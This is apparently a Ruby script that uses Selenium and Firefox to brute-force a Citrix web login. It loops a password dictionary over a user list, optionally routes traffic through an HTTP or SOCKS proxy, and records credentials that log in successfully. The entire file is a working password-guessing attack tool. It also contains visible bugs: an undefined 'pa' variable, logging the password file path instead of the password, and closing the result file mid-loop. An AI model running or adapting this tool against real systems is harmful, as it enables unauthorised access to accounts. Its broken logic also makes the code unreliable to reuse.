begin
	require "selenium-webdriver"
rescue 
	puts "Selenium webdriver is not installed please install \"gem intall selenium-webdriver\""
end



class Citrix #< Logical_Chaos
	def initialize(host,path,file,password,result_file,proxy,http_proxy)
		
			@base_url = host 
			@path = path
			
			if proxy == ""
				profile = Selenium::WebDriver::Firefox::Profile.new
				if http_proxy == ""
				  # No proxy
				  @driver = Selenium::WebDriver.for :firefox
				else
  				# Firefox profile configure HTTP(S) proxy
  				
  				proxy_info = http_proxy.split(":")
  				profile['network.proxy.http'] = proxy_info[0].to_s
  				profile['network.proxy.http_port'] = proxy_info[1].to_i
  				profile['network.proxy.ssl'] = proxy_info[0].to_s
  				profile['network.proxy.ssl_port'] = proxy_info[1].to_i
  				profile['network.proxy.type'] = 1
  				@driver = Selenium::WebDriver.for :firefox, :profile => profile
  			end
			else
				# Firefox profile configure socks proxy
				profile = Selenium::WebDriver::Firefox::Profile.new
				
				proxy_info = proxy.split(":")
				profile['network.proxy.socks'] = proxy_info[0].to_s
				profile['network.proxy.socks_port'] = proxy_info[1].to_i
				profile['network.proxy.type'] = 1

				@driver = Selenium::WebDriver.for :firefox, :profile => profile
			end
			
			@accept_next_alert = true
			@driver.manage.timeouts.implicit_wait = 10
			@verification_errors = []
			
			# Provide a file with a list of users 
			@file= file
			
			# Password file to use
			@password = password
			
			# Provide a result file where valid users and passwords will be stored
			@result_file = result_file
		
	end
	
	def brute_user_password
		begin
			f = nil
			result = File.new(@result_file,'w+')
			p = ""
			if File.exists?(@password.to_s)
				p = File.new(@password,'r+')
			else
				p = File.new('dictionaries/passwd1','r+')
			end
			p.each do |passwd|
			  f = File.new(@file,'r+')
				f.each do |user|
					user = user.to_s.strip
					passwd = passwd.to_s.strip
					puts "Testing User:#{user} Password:#{passwd}"
					@driver.get(@base_url + @path)
					@driver.find_element(:id, "user").clear
					@driver.find_element(:id, "user").send_keys user.to_s
					@driver.find_element(:id, "password").clear
					@driver.find_element(:id, "password").send_keys passwd.to_s
					@driver.find_element(:id, "loginButtonWrapper").click
					
					if element_present?(:id, "loginButtonWrapper")
						#Wrong password
						@driver.manage.delete_all_cookies
					elsif element_present?(:id, "logoutAreaLogoutLink")
						pa.puts "User:#{user} Password:#{@password}"
						puts "Yeah!!!!!!!!!!!!!! Correct password!   User:#{user} Password:#{passwd}"
						@driver.find_element(:id, "logoutAreaLogoutLink").click
						@driver.manage.delete_all_cookies
						result.puts "User:#{user} Password:#{@password}"
						result.close
					else
						puts "Yeah!!!!!!!!!!!!!! Correct password!   User:#{user} Password:#{passwd}"
						@driver.find_element(:name, "reset1").click
						@driver.manage.delete_all_cookies
						result.puts "User:#{user} Password:#{@password}"
						result.close
					end
				end
				f.close
			end
			result.close
			p.close
			@driver.quit
		rescue Exception => e  
			puts e.message  
			#puts e.backtrace.inspect
		end
	end
	
	def read_file
		f = File.new(@file,'r+')
		f.each do |line|
			puts line
		end
		f.close
	end
	
	def element_present?(how, what)
		@driver.find_element(how, what)
		true
	rescue Selenium::WebDriver::Error::NoSuchElementError
		false
	end
  
	def verify(&blk)
		yield
	rescue ExpectationNotMetError => ex
		@verification_errors << ex
	end
  
	def close_alert_and_get_its_text(how, what)
		alert = @driver.switch_to().alert()
		if (@accept_next_alert) then
			alert.accept()
		else
			alert.dismiss()
		end
			alert.text
		ensure
			@accept_next_alert = true
	end
end


